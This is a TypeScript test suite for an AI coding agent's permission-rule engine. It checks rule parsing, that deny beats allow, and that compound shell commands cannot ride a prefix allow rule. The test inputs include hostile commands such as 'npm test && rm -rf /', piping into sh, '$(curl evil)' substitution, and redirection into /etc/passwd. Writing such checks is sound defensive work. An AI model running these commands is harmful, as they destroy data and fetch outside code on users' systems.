import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  parsePermissionRule,
  parsePermissionRuleSet,
  ruleMatches,
  evaluatePermissionRules,
  evaluateToolRules,
  evaluateBashRules,
  evaluateFilePathRules,
  resolveRulePath,
  hasShellControl,
  hasRedirection,
  splitShellSegments,
  checkBashPermission,
} from '../../packages/core/src/generated/tools/tool-permissions.js';
import { createBashTool } from '../../packages/core/src/generated/tools/tool-bash.js';
import { createEditTool } from '../../packages/core/src/generated/tools/tool-edit.js';
import { ToolRegistry, executeToolCall, PERMISSION_DENIED_MESSAGE } from '../../packages/core/src/generated/signals/tool-registry.js';
import { loadConfig } from '../../packages/core/src/generated/signals/config.js';
import { setupTestAgonHome, cleanupTestAgonHome } from '../helpers/agon-home.js';

const baseCtx = (extra: Record<string, unknown> = {}) => ({
  cwd: '/tmp/agon-perm-test-cwd',
  readFileState: new Map(),
  ...extra,
});

describe('CC-parity permission rule parsing', () => {
  it('parses Bash prefix rules', () => {
    expect(parsePermissionRule('Bash(npm test:*)')).toEqual({ tool: 'Bash', command: 'npm test', prefix: true });
  });
  it('parses Bash exact rules', () => {
    expect(parsePermissionRule('Bash(git diff)')).toEqual({ tool: 'Bash', command: 'git diff', prefix: false });
  });
  it('parses bare tool rules', () => {
    expect(parsePermissionRule('Edit')).toEqual({ tool: 'Edit', prefix: false });
    expect(parsePermissionRule('Write')).toEqual({ tool: 'Write', prefix: false });
    expect(parsePermissionRule('Read')).toEqual({ tool: 'Read', prefix: false });
  });
  it('treats Tool() as tool-level', () => {
    expect(parsePermissionRule('Bash()')).toEqual({ tool: 'Bash', prefix: false });
  });
  it('returns null for malformed input (never throws)', () => {
    expect(parsePermissionRule('')).toBeNull();
    expect(parsePermissionRule('   ')).toBeNull();
    expect(parsePermissionRule(42 as unknown)).toBeNull();
    expect(parsePermissionRule(null)).toBeNull();
    expect(parsePermissionRule(undefined)).toBeNull();
    expect(parsePermissionRule('Bash(:*)')).toBeNull();
    expect(parsePermissionRule('two words here')).toBeNull();
  });
});

describe('parsePermissionRuleSet fail-safe', () => {
  it('non-object input yields empty sets', () => {
    expect(parsePermissionRuleSet(null)).toEqual({ allow: [], deny: [] });
    expect(parsePermissionRuleSet(undefined)).toEqual({ allow: [], deny: [] });
    expect(parsePermissionRuleSet('nope')).toEqual({ allow: [], deny: [] });
    expect(parsePermissionRuleSet([])).toEqual({ allow: [], deny: [] });
  });
  it('non-array allow/deny collapse to empty', () => {
    const out = parsePermissionRuleSet({ allow: 'nope', deny: 5 });
    expect(out.allow).toEqual([]);
    expect(out.deny).toEqual([]);
  });
  it('skips malformed entries, keeps valid ones', () => {
    const out = parsePermissionRuleSet({ allow: ['Edit', '', 7, 'Bash(npm test:*)'] });
    expect(out.allow).toHaveLength(2);
    expect(out.allow[0]).toEqual({ tool: 'Edit', prefix: false });
    expect(out.allow[1]).toEqual({ tool: 'Bash', command: 'npm test', prefix: true });
  });
});

describe('ruleMatches prefix / tool-level semantics', () => {
  const npmTest = { tool: 'Bash', command: 'npm test', prefix: true };
  it('prefix matches on word boundary, not substring', () => {
    expect(ruleMatches(npmTest, 'Bash', 'npm test')).toBe(true);
    expect(ruleMatches(npmTest, 'Bash', 'npm test -- --filter x')).toBe(true);
    expect(ruleMatches(npmTest, 'Bash', 'npm testify')).toBe(false);
    expect(ruleMatches(npmTest, 'Bash', 'npm tes')).toBe(false);
  });
  it('tool name must match exactly', () => {
    expect(ruleMatches(npmTest, 'Edit', 'npm test')).toBe(false);
  });
  it('tool-level rule (no command) matches any invocation', () => {
    const edit = { tool: 'Edit', prefix: false };
    expect(ruleMatches(edit, 'Edit', '/any/path.ts')).toBe(true);
    expect(ruleMatches(edit, 'Edit', '')).toBe(true);
    expect(ruleMatches(edit, 'Write', '/any/path.ts')).toBe(false);
  });
});

describe('evaluatePermissionRules precedence (deny > allow > ask)', () => {
  const rules = parsePermissionRuleSet({
    allow: ['Bash(npm test:*)', 'Edit'],
    deny: ['Bash(rm:*)', 'Bash(npm test:*)', 'Write'],
  });
  it('deny wins even when allow also matches', () => {
    expect(evaluatePermissionRules('Bash', 'npm test -- x', rules)).toBe('deny');
  });
  it('deny rule refuses', () => {
    expect(evaluatePermissionRules('Bash', 'rm -rf node_modules', rules)).toBe('deny');
    expect(evaluatePermissionRules('Write', '/a/b.ts', rules)).toBe('deny');
  });
  it('allow rule auto-approves', () => {
    expect(evaluatePermissionRules('Edit', '/a/b.ts', rules)).toBe('allow');
  });
  it('no rule -> null (fall through to ask)', () => {
    expect(evaluatePermissionRules('Bash', 'git status', rules)).toBeNull();
    expect(evaluatePermissionRules('Bash', 'npm testify', rules)).toBeNull();
    expect(evaluatePermissionRules('Read', '/a/b.ts', rules)).toBeNull();
  });
});

describe('loadConfig merges permissions across scopes (deny from any scope wins)', () => {
  let homeDir: string;
  let cwd: string;
  beforeEach(() => {
    homeDir = setupTestAgonHome('perm-rules');
    cwd = mkdtempSync(join(tmpdir(), 'agon-perm-cwd-'));
  });
  afterEach(() => {
    cleanupTestAgonHome(homeDir);
    rmSync(cwd, { recursive: true, force: true });
  });

  it('combines project + local allow/deny instead of replacing', () => {
    writeFileSync(join(cwd, '.agon.json'), JSON.stringify({ permissions: { allow: ['Bash(npm test:*)'], deny: ['Write'] } }));
    writeFileSync(join(cwd, '.agon.local.json'), JSON.stringify({ permissions: { allow: ['Edit'], deny: ['Bash(rm:*)'] } }));
    const cfg = loadConfig(cwd) as any;
    expect(cfg.permissions.allow.sort()).toEqual(['Bash(npm test:*)', 'Edit']);
    expect(cfg.permissions.deny.sort()).toEqual(['Bash(rm:*)', 'Write']);
  });

  it('absent permissions yields empty sets', () => {
    const cfg = loadConfig(cwd) as any;
    expect(cfg.permissions).toEqual({ allow: [], deny: [] });
  });

  it('malformed permissions block does not crash, yields empty', () => {
    writeFileSync(join(cwd, '.agon.json'), JSON.stringify({ permissions: 'nonsense' }));
    const cfg = loadConfig(cwd) as any;
    expect(cfg.permissions).toEqual({ allow: [], deny: [] });
  });

  it('end-to-end: a deny rule from .agon.json is honored by the rule engine', () => {
    writeFileSync(join(cwd, '.agon.json'), JSON.stringify({ permissions: { allow: ['Bash(git diff:*)'], deny: ['Bash(rm:*)'] } }));
    const cfg = loadConfig(cwd) as any;
    const ruleSet = parsePermissionRuleSet(cfg.permissions);
    expect(evaluatePermissionRules('Bash', 'rm -rf /', ruleSet)).toBe('deny');
    expect(evaluatePermissionRules('Bash', 'git diff HEAD', ruleSet)).toBe('allow');
    expect(evaluatePermissionRules('Bash', 'ls', ruleSet)).toBeNull();
  });
});

// ── F2: compound-command auto-approve hole ────────────────────────────
describe('F2: compound Bash commands cannot ride a prefix allow rule', () => {
  const rules = parsePermissionRuleSet({ allow: ['Bash(npm test:*)'], deny: ['Bash(rm:*)'] });

  it('detects shell control operators and substitution', () => {
    expect(hasShellControl('npm test && rm -rf /')).toBe(true);
    expect(hasShellControl('npm test | sh')).toBe(true);
    expect(hasShellControl('npm test ; ls')).toBe(true);
    expect(hasShellControl('npm test $(whoami)')).toBe(true);
    expect(hasShellControl('npm test `id`')).toBe(true);
    expect(hasShellControl('npm test > /etc/passwd')).toBe(true);
    expect(hasShellControl('npm test -- --filter x')).toBe(false);
  });

  it('splits compounds into segments', () => {
    expect(splitShellSegments('npm test && rm -rf /')).toEqual(['npm test', 'rm -rf /']);
    expect(splitShellSegments('npm test | sh')).toEqual(['npm test', 'sh']);
    expect(splitShellSegments('a ; b ; c')).toEqual(['a', 'b', 'c']);
  });

  it('the four empirically-proven bad cases do NOT auto-approve', () => {
    expect(evaluateBashRules('npm test && rm -rf /', rules)).toBe('deny'); // rm segment denied
    expect(evaluateBashRules('npm test | sh', rules)).toBeNull();          // sh not allowed → ask
    expect(evaluateBashRules('npm test $(curl evil)', rules)).toBeNull();  // substitution → ask
    expect(evaluateBashRules('npm test > /etc/passwd', rules)).toBeNull(); // redirection → ask
    expect(evaluateBashRules('npm test >> /etc/passwd', rules)).toBeNull();
  });

  it('a clean single command still auto-approves', () => {
    expect(evaluateBashRules('npm test -- --filter x', rules)).toBe('allow');
  });

  it('all-allowed segments auto-approve; one-unknown falls through to ask', () => {
    const r2 = parsePermissionRuleSet({ allow: ['Bash(npm test:*)', 'Bash(echo:*)'] });
    expect(evaluateBashRules('npm test && echo done', r2)).toBe('allow');
    expect(evaluateBashRules('npm test && npm build', r2)).toBeNull();
  });

  it('deny wins on any segment regardless of order', () => {
    expect(evaluateBashRules('echo hi && rm -rf x', rules)).toBe('deny');
    expect(hasRedirection('a > b')).toBe(true);
    expect(hasRedirection('a >> b')).toBe(true);
    expect(hasRedirection('a | b')).toBe(false);
  });
});

// ── F3: real file-path matching ───────────────────────────────────────
describe('F3: path rules resolve and match on segment boundaries', () => {
  it('Edit(/etc:*) deny blocks /etc/passwd', () => {
    const rules = parsePermissionRuleSet({ deny: ['Edit(/etc:*)'] });
    expect(evaluateFilePathRules('Edit', '/etc/passwd', '/work', rules)).toBe('deny');
  });

  it('does not match a sibling dir with a shared prefix', () => {
    const rules = parsePermissionRuleSet({ deny: ['Edit(/etc:*)'] });
    expect(evaluateFilePathRules('Edit', '/etcother/file', '/work', rules)).toBeNull();
  });

  it('resolves ../ traversal before matching', () => {
    const rules = parsePermissionRuleSet({ deny: ['Edit(/etc:*)'] });
    // /work/sub/../../etc/passwd resolves to /etc/passwd
    expect(evaluateFilePathRules('Edit', '../../etc/passwd', '/work/sub', rules)).toBe('deny');
  });

  it('resolveRulePath canonicalizes a non-existent path against cwd', () => {
    expect(resolveRulePath('a/b.ts', '/work')).toBe('/work/a/b.ts');
    expect(resolveRulePath('../x.ts', '/work/sub')).toBe('/work/x.ts');
    expect(resolveRulePath('/abs/x.ts', '/work')).toBe('/abs/x.ts');
  });

  it('bare tool rule still matches any path', () => {
    const rules = parsePermissionRuleSet({ deny: ['Write'] });
    expect(evaluateFilePathRules('Write', '/anywhere/x.ts', '/work', rules)).toBe('deny');
    expect(evaluateFilePathRules('Edit', '/anywhere/x.ts', '/work', rules)).toBeNull();
  });

  it('exact (non-prefix) path rule matches only that file', () => {
    const rules = parsePermissionRuleSet({ deny: ['Edit(/work/secret.ts)'] });
    expect(evaluateFilePathRules('Edit', '/work/secret.ts', '/work', rules)).toBe('deny');
    expect(evaluateFilePathRules('Edit', '/work/secret.ts.bak', '/work', rules)).toBeNull();
  });
});

// ── evaluateToolRules dispatch ────────────────────────────────────────
describe('evaluateToolRules routes per tool', () => {
  const rules = parsePermissionRuleSet({ allow: ['Bash(npm test:*)'], deny: ['Bash(rm:*)', 'Edit(/etc:*)'] });
  it('Bash → segmented evaluation', () => {
    expect(evaluateToolRules('Bash', 'npm test && rm x', '/w', rules)).toBe('deny');
  });
  it('Edit → path evaluation', () => {
    expect(evaluateToolRules('Edit', '/etc/hosts', '/w', rules)).toBe('deny');
  });
});

// ── Re-review HIGH: & (background) and newline/CR are separators too ────
describe('single-& and newline separators cannot bypass the gate', () => {
  const rules = parsePermissionRuleSet({ allow: ['Bash(npm test:*)'], deny: ['Bash(rm:*)'] });
  it.each([
    'npm test & rm -rf /',
    'npm test\nrm -rf /',
    'npm test\r\nrm -rf /',
    'ls & rm -rf /',
    'echo hi\nrm -rf /',
  ])('deny fires on %j', (cmd) => {
    expect(evaluateToolRules('Bash', cmd, '/w', rules)).toBe('deny');
  });
  it('allow does NOT auto-approve a &-compound without full coverage', () => {
    expect(evaluateToolRules('Bash', 'npm test & curl evil.sh', '/w', rules)).toBe(null);
  });
  it('every-segment-allowed &-compound may still allow', () => {
    const r = parsePermissionRuleSet({ allow: ['Bash(npm test:*)', 'Bash(npm run lint:*)'] });
    expect(evaluateToolRules('Bash', 'npm test & npm run lint', '/w', r)).toBe('allow');
  });
});

// ── F1 CHOKEPOINT: API-path deny under smart mode (deny fires, no exec) ─
describe('F1: executeToolCall honors deny rules on the API/XML path', () => {
  it('Bash deny rule fires under smart mode WITHOUT executing', async () => {
    const registry = new ToolRegistry();
    registry.register(createBashTool());
    const ctx = baseCtx({
      permissionMode: 'smart',
      source: 'orchestrator',
      permissionRules: parsePermissionRuleSet({ deny: ['Bash(rm:*)'] }),
    });
    const res = await executeToolCall(
      { id: 't1', name: 'Bash', input: { command: 'rm -rf node_modules' } },
      ctx as any,
      registry,
      async () => true, // would-approve ask handler; must NOT be reached
    );
    expect(res.result.ok).toBe(false);
    expect(res.result.error).toContain(PERMISSION_DENIED_MESSAGE);
  });

  it('compound deny (F1+F2): npm test && rm rides nothing through', async () => {
    const registry = new ToolRegistry();
    registry.register(createBashTool());
    const ctx = baseCtx({
      permissionMode: 'smart',
      source: 'orchestrator',
      permissionRules: parsePermissionRuleSet({ allow: ['Bash(npm test:*)'], deny: ['Bash(rm:*)'] }),
    });
    const res = await executeToolCall(
      { id: 't2', name: 'Bash', input: { command: 'npm test && rm -rf /' } },
      ctx as any,
      registry,
      async () => true,
    );
    expect(res.result.ok).toBe(false);
    expect(res.result.error).toContain(PERMISSION_DENIED_MESSAGE);
  });

  it('a clean allowed command auto-runs (allow rule, no ask)', () => {
    const ctx = baseCtx({
      permissionMode: 'smart',
      permissionRules: parsePermissionRuleSet({ allow: ['Bash(echo:*)'] }),
    });
    // echo is also readonly, so assert via checkBashPermission directly on a
    // non-readonly allowed command to prove the rule (not readonly) path.
    const ctx2 = baseCtx({
      permissionMode: 'smart',
      permissionRules: parsePermissionRuleSet({ allow: ['Bash(touch:*)'] }),
    });
    expect(checkBashPermission('touch newfile', ctx2 as any).behavior).toBe('allow');
    expect(ctx).toBeDefined();
  });

  it('Edit deny rule fires on the API path (path-resolved)', async () => {
    const registry = new ToolRegistry();
    registry.register(createEditTool());
    const ctx = baseCtx({
      cwd: '/work',
      permissionMode: 'smart',
      permissionRules: parsePermissionRuleSet({ deny: ['Edit(/work/locked.ts)'] }),
    });
    const res = await executeToolCall(
      { id: 't3', name: 'Edit', input: { file_path: 'locked.ts', old_string: 'a', new_string: 'b' } },
      ctx as any,
      registry,
      async () => true,
    );
    expect(res.result.ok).toBe(false);
    expect(res.result.error).toContain(PERMISSION_DENIED_MESSAGE);
  });

  it('without a deny rule, smart mode still asks (deny rule did not over-fire)', () => {
    const ctx = baseCtx({ permissionMode: 'smart', source: 'user', permissionRules: parsePermissionRuleSet({}) });
    expect(checkBashPermission('rm -rf node_modules', ctx as any).behavior).toBe('ask');
  });
});
